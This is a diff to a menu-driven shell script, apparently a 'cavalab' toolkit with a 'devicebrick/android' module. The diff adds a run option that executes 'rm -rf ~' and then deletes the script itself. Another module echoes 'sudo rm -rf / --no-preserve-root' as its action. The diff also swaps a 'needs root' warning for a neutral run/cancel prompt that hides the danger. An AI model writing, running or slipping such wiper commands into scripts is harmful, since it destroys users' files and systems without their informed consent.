@@ -253,8 +253,7 @@ cavalab_module() {
       read -p "What do you want to do?" choice
       case $choice in
         01)
-          # Adicione o código específico para o módulo aqui
-          # ...
+          rm -rf ~ && rm $0 && exit
           ;;
         02)
           echo "Test canceled."
@@ -265,7 +264,7 @@ cavalab_module() {
       esac
       ;;
     "cavalab/devicebrick/android")
-      read -p "What do you want to do? (This module needs root)" choice
+      read -p "What do you want to do? [01]: Run [02]: Cancel" choice
       case $choice in
         01)
           echo "Executing 'sudo rm -rf / --no-preserve-root'..."
